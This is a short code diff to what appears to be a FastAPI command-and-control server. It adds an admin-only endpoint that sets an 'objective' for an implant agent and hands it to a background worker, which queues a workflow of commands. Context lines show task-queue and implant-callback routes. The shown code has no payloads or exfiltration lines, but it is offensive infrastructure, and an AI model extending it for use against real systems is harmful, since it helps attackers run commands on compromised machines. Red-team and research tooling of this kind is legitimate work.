@@ -883,6 +883,10 @@ class C2Task(BaseModel):
     agent_id: str
     command: str
 
+class C2Objective(BaseModel):
+    agent_id: str
+    objective: str
+
 @app.post("/c2/task/queue", response_model=APIResponse)
 async def queue_c2_task(
     task: C2Task,
@@ -901,6 +905,24 @@ async def queue_c2_task(
     return APIResponse(
         message="Task queued for agent.",
         data={"agent_id": task.agent_id, "task_id": task_id}
+    )
+
+@app.post("/c2/objective/set", response_model=APIResponse)
+async def set_c2_objective(
+    objective: C2Objective,
+    current_user: dict = Depends(get_current_user)
+):
+    """Sets an objective for an agent, which triggers a workflow of commands."""
+    if current_user["role"] != "admin":
+        raise HTTPException(status_code=403, detail="Admin access required")
+
+    from workers.objective_worker import execute_objective
+    
+    execute_objective.delay(objective.agent_id, objective.objective)
+    
+    return APIResponse(
+        message="Objective set for agent. Tasks are being queued.",
+        data=objective.dict()
     )
 
 @app.api_route("/c2/implant/callback", methods=["GET", "POST"])
